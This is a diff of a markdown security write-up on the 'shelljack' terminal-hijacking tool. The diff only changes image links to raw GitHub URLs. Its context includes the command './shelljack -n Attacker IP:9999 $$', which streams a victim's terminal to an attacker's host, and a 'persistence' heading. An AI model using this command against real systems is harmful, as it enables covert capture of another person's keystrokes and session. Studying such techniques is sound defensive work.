@@ -44,17 +44,17 @@ tty
 ./shelljack -n Attacker IP:9999 $$
 ```
 
-![](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/victim_poc.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc.png)
 
 Now when the victim writes a command, we can see it in our machine.
 
 Victim:
 
-![](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/victim_poc_1.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc_1.png)
 
 Attacker:
 
-![](https://github.com/M4luk0/m4luk0.github.io/blob/master/images/attacker_poc_1.png)
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/attacker_poc_1.png)
 
 ## [](#header-2)Applying persistence
 
